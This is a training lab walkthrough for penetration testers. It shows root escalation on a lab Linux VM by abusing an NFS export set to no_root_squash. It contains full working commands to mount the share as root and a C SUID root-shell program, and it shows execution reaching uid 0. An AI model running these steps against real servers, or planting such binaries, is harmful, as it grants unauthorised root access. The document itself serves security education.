Linux Privilege Escalation via NFS no_root_squash

Exploit a misconfigured NFS export to place a SUID root binary on the server filesystem and achieve root code execution. This technique is remote-to-root and requires no credentials on the target beyond NFS access.

🔎 Pre-Flight Checks

Run these commands in your Kali terminal to confirm the target VMs are reachable before you start. Copy the IP from the Systems tab on the left.

⚠ NFS (2049) is the exploitation target for this lab - it must be open.
SYNTEX-LNX01
LNX_IP=<click IP in Systems tab, then Paste>
for p in 22 2049 111; do nc -zv -w2 $LNX_IP $p 2>&1; done
  • SYNTEX-LNX01 is showing Running in the Systems tab with an IP assigned
  • nc output shows open for the key ports above
  • Kali Linux terminal is open and ready

Scenario

During NFS enumeration you discovered that SYNTEX-LNX01 exports /exports/data with the no_root_squash option. This means when root on your Kali machine writes to that NFS share, the files are created as root on the target - not remapped to nobody. You can exploit this by placing a SUID shell binary in the export and executing it from a low-privilege shell on the target. This is a classic but often overlooked escalation vector.

Learning Objectives
  • Understand why no_root_squash is a critical NFS misconfiguration
  • Mount the NFS export from Kali as root
  • Compile and place a SUID shell binary via NFS
  • Execute the binary from a low-privilege shell to achieve root

Phase 1 - Confirm the NFS Misconfiguration
1
Enumerate NFS Exports

Confirm the export configuration from your Kali machine before attempting exploitation.

# From Kali - check what is exported
showmount -e <LNX01-IP>

Export list for <LNX01-IP>:
/exports/data *

# Check the detailed export options (from the target - if you have SSH access)
# SSH in as jsmith and check /etc/exports
ssh jsmith@<LNX01-IP>
cat /etc/exports
ℹ
What to look for in /etc/exports: The entry /exports/data *(rw,sync,no_subtree_check,no_root_squash) is the vulnerable configuration. The * means any host can mount it. rw means read-write. no_root_squash is the dangerous part.
NFS export configuration
Phase 2 - Mount as Root and Plant the SUID Binary
2
Mount the NFS Share from Kali as Root

All steps in this phase run on your Kali machine as root. The key: when root mounts no_root_squash NFS, files written to it are owned by root on the server.

# On Kali - become root first
sudo su

# Create a local mount point
mkdir /mnt/syntex-nfs

# Mount the NFS share
mount -t nfs <LNX01-IP>:/exports/data /mnt/syntex-nfs

# Verify the mount worked
ls -la /mnt/syntex-nfs/

# Confirm ownership of existing files
ls -la /mnt/syntex-nfs/
NFS mount result
3
Compile the SUID Shell Binary

Create a small C program that drops a root shell when executed. Compile it on Kali, then copy it to the NFS share as root. Setting the SUID bit while root on Kali means the file appears SUID root on the target.

# On Kali as root - write the C source
cat > /tmp/suid_shell.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

# Compile for the target (same arch - Linux x64)
gcc /tmp/suid_shell.c -o /mnt/syntex-nfs/rootme

# Set SUID bit - because we are root on no_root_squash NFS,
# this sets SUID root ON THE TARGET
chmod u+s /mnt/syntex-nfs/rootme
chmod +x /mnt/syntex-nfs/rootme

# Verify the SUID bit was set
ls -la /mnt/syntex-nfs/rootme
-rwsr-xr-x 1 root root 8432 ... rootme
★
CREST Exam Point: The s in -rwsr-xr-x is the SUID bit. When a non-root user executes a file with this bit set and the file is owned by root, the process runs as root. This is the core of the no_root_squash attack.
SUID binary placed
Phase 3 - Execute from the Target
4
Execute the SUID Binary as jsmith

Switch to your SSH session on SYNTEX-LNX01 as jsmith. The binary you placed is in /exports/data/ - execute it to get a root shell.

# On SYNTEX-LNX01 as jsmith
ls -la /exports/data/
# You should see rootme with the SUID bit set and owned by root

# Execute it
/exports/data/rootme

# Confirm root
id
whoami
uid=0(root) gid=0(root) groups=0(root),1001(jsmith)
ℹ
-p flag in bash: The bash -p in the C source tells bash not to drop privileges when it detects a SUID parent. Without -p modern bash drops effective UID back to the real UID as a security measure.
Root achieved via NFS
5
Cleanup (Important)

After demonstrating exploitation, clean up the planted binary. Good testers leave systems clean.

# On Kali as root - remove the planted binary
rm /mnt/syntex-nfs/rootme

# Unmount the NFS share
umount /mnt/syntex-nfs

# Verify it is gone from the target
# Back on SYNTEX-LNX01 as jsmith:
ls -la /exports/data/
# rootme should no longer be present
